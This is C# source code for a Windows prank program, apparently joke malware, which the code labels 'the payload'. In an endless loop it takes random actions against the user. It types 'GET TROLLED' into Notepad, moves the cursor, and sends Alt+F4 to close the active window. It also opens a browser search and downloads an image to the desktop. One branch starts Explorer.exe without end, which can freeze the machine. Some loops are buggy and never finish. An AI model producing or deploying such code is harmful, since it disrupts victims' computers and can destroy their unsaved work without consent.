using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Runtime.InteropServices;
using System.Threading;
using System.Net;
using System.IO;

namespace sus
{
    class Program
    {
        [DllImport("user32")]//mouse control
        public static extern int SetCursorPos(int x, int y);
        [DllImport("user32")]//keyboard control
        public static extern void keybd_event(byte bVk, byte bScan, uint dwFlags, IntPtr dwExtraInfo);
        static void Main(string[] args)
        {
            //variables
            int w ,x, y;
            Random z = new Random();
            WebClient spider = new WebClient();
            string filePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Desktop));
            int h = 0;
            //the payload
            do
            {
                //happen randomly when it feels like it
                w = z.Next(0, 15000);
                Thread.Sleep(w);
                w = z.Next(0, 8);
                switch (w)
                {
                    case 1://get trolled notepad
                        System.Diagnostics.Process.Start("Notepad.exe");
                        Thread.Sleep(1000);
                        keybd_event((byte)0x47, 1, 0, IntPtr.Zero);
                        keybd_event((byte)0x45, 1, 0, IntPtr.Zero);
                        keybd_event((byte)0x54, 1, 0, IntPtr.Zero);
                        keybd_event((byte)0x0D, 1, 0, IntPtr.Zero);
                        keybd_event((byte)0x54, 1, 0, IntPtr.Zero);
                        keybd_event((byte)0x52, 1, 0, IntPtr.Zero);
                        keybd_event((byte)0x4F, 1, 0, IntPtr.Zero);
                        keybd_event((byte)0x4C, 1, 0, IntPtr.Zero);
                        keybd_event((byte)0x4C, 1, 0, IntPtr.Zero);
                        keybd_event((byte)0x45, 1, 0, IntPtr.Zero);
                        keybd_event((byte)0x44, 1, 0, IntPtr.Zero);
                        keybd_event((byte)0x0D, 1, 0, IntPtr.Zero);
                        break;
                    case 2:
                        h = z.Next(1, 1000);
                        do
                        {
                            y = z.Next(1, 1000);
                            x = z.Next(1, 2000);
                        } while (h < 1000);
                        SetCursorPos(x, y);
                        break;
                    case 3:
                        break;
                    case 4:
                        System.Diagnostics.Process.Start("https://duckduckgo.com/?t=ffab&q=how+to+save+my+computer&ia=web");
                        break;
                    case 5:
                        keybd_event((byte)0x12, 1, 0, IntPtr.Zero);
                        keybd_event((byte)0x73, 1, 0, IntPtr.Zero);
                        break;
                    case 6:
                        Console.Beep(2349, 100);//d
                        Console.Beep(2349, 100);//d
                        Console.Beep(4698, 200);//d
                        Console.Beep(3520, 100);//a
                        break;
                    case 7:
                        do
                        {
                            System.Diagnostics.Process.Start("Explorer.exe");
                        }while (h < 200);
                        break;
                    case 8:
                        spider.DownloadFile("https://p7.hiclipart.com/preview/111/174/442/turtle-emoji-android-oreo-turtle.jpg", filePath+@"\turtle.jpg");
                        break;
                }
            } while (!false);
          //
        }
    }
}
